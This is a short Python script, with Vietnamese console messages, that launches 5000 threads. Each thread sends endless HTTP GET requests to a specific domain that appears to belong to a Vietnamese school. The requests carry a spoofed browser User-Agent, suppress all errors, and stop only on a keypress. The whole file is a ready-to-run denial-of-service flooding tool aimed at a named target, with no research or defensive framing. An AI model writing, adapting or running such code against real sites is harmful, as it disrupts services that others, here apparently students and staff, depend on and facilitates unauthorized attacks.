import requests
import threading
import keyboard

stop = False

def flood():
    url = "https://thcscaugiay.edu.vn"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    while not stop:
        try:
            requests.get(url, headers=headers, timeout=1)
        except:
            pass

threads = 5000
for _ in range(threads):
    threading.Thread(target=flood).start()

print("K Để Dừng")
keyboard.wait('k')
stop = True
print("Đã dừng!")
